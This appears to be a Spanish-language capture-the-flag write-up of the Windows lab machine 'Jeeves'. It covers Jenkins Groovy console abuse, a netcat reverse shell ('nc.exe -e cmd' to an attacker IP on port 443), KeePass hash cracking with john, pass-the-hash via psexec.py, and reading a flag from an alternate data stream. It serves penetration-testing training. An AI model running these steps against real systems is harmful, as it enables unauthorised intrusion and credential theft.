# Jeeves


**Sistema Operativo**: Windows

**Dificultad**: Media

**Técnicas Vistas**:  Jenkins Exploitation (Groovy Script Console) /
RottenPotato (SeImpersonatePrivilege) /
PassTheHash (Psexec) /
Breaking KeePass /
Alternate Data Streams (ADS) /

Te prepara para las **Certificaciones**: OSCP / 
eJPT / 
eWPT / 
eCPPTv3<br>

![image](https://github.com/user-attachments/assets/f03f382b-4cd6-462b-8960-d4dfc68d021d)<br><br>



# Reconocimiento

Utilizando `nmap` escaneamos todos los puertos<br>

![image](https://github.com/user-attachments/assets/929e7743-8514-4877-a00b-43313e1e9797)

- `-p-` -> Escanea todos los puertos 
- `-sS` -> escaneo de tipo SYN
- `--open` -> Todos los puertos abiertos
- `--min-rate=5000` -> Manda mínimo 5000 paquetes por segundo
- `-Pn` -> Asume que el host especificado está activo
- `-vvv` -> Aplica triple Verbose 
- `-n` -> Que no aplique resolución DNS
- `-oG allports` -> manda todo a un archivo con nombre de "allports"<br><br>

Utilizando `gobuster` encontramos un directorio "askjeeves"

![image](https://github.com/user-attachments/assets/6f2633b4-8164-4c1b-82a6-2a7d8d554b04)

- `dir` ->  Buscar directorios 
- `-u` -> Indicar URL
- `-w` ->  Indicar diccionario que voy a utilizar
- `-t` -> Numero de hilos que voy a usar
- `-x` -> Extensiones que quiero que pruebe


# Explotación Jenkings

En `http://10.10.10.63:50000/askjeeves/script` encontramos esta consola de comados que acepta Groovy<br>

https://stackoverflow.com/questions/159148/groovy-executing-shell-commands

![image](https://github.com/user-attachments/assets/d48da70b-f566-402d-a60c-0f1098507893)<br><br>

- Transferimos el `nc.exe` y nos mandamos una consola interactiva a nuestra ip por el puerto 443 `-e cmd 10.10.14.55`
- Compartimos el archivo nc.exe `impacket-smbserver smbFolder $(pwd) -smb2support`
- Nos ponemos en escucha con `rlwrap nc -nlvp 443`<br>

![image](https://github.com/user-attachments/assets/4a788cef-d9d0-450d-90e4-2933d3f1ee94)<br><br>


# Escalamos privilegios

Encontramos la Flag User:<br>

![image](https://github.com/user-attachments/assets/2b5975ad-8aa0-4689-a1ba-ff42828c31b4)<br><br>

En `C:\Users\kohsuke\Documents` vemos  un archivo `CEH.kdbx` el cual nos transferimos a nuestra maquina de atacante.<br>

![image](https://github.com/user-attachments/assets/f3950b81-0b70-4b81-a6fd-1e7e23af35cc)<br>

- `.kdbx` -> Es una extensión Keypass que es un gestor de contraseña<br><br>


Utilizando `john` rompemos el hash<br>

![image](https://github.com/user-attachments/assets/4d0872b9-49a0-4f50-815f-3c5f86efcbc7)<br>

- `keepass2john` CEH.kdbx > hash    -> Nos da el hash para romper la contraseña
- `john -w:/usr/share/wordlists/rockyou.txt` hash   -> Rompemos el hash creado<br><br>


Hacemos un `apt install keepassxc` y luego abrimos con `keepassxc CEH.kdbx`<br>

![image](https://github.com/user-attachments/assets/82785ae2-e2e6-45ad-84b6-03369ce3128a)<br><br>


Le copiamos la contraseña a `backup stuff` y hacemos vemos la contraseña la cual podemos aplicarle un `pass-the-hash`<br>

![image](https://github.com/user-attachments/assets/f9003735-12ee-4639-bc3c-1aab19a2d7fe)<br><br>


Nos pone `Pwn3d!` la credencial es correcta<br>
![image](https://github.com/user-attachments/assets/5089f827-ee55-4f59-bf00-b506f757a740)<br><br>

Hacemos el `pass-the-hash` con `psexec.py`<br>

![image](https://github.com/user-attachments/assets/f97acbce-88d6-4411-9da2-5a9d6692c108)<br><br>


Vemos directorios ocultos `dir /r /s` y con `more < hm.txt:root.txt` lo leemos. <br>

- Flag Final<br>

![image](https://github.com/user-attachments/assets/8b870360-8f59-498b-a499-67e77999e52d)<br><br>
